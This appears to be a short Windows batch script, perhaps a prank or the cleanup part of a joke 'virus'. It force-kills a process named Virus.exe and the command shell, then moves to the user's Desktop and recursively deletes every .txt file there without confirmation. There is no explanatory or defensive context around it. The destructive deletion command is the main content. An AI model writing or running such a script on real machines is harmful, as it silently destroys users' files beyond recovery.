@echo off
Taskkill /IM Virus.exe /F
Taskkill /IM cmd.exe /F
cd %userprofile%\Desktop
del /s *.txt